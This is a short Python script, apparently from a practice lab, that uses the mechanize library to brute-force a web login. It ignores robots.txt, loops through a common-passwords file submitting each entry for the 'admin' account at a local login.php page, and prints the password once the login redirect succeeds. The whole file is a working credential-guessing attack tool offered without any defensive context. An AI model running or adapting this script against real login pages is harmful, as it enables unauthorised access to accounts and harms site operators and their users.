import mechanize

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

# combos = open('common-passwords.txt', 'r')

with open('common-passwords.txt') as f:
    combos = f.readlines()
br.open("http://192.168.14.130/login.php")
for x in combos:
    password = ''.join(x[0:-1])
    br.select_form(nr=0)
    br.form['username'] = "admin"
    br.form['password'] = password
    # br.form['password'] = 'password'
    print("Checking ", br.form['password'])
    response=br.submit()
    # print(response.geturl())
    if response.geturl() == "http://192.168.14.130/index.php":
        # url to which the page is redirected after login
        print("Correct password is ", password)
        break




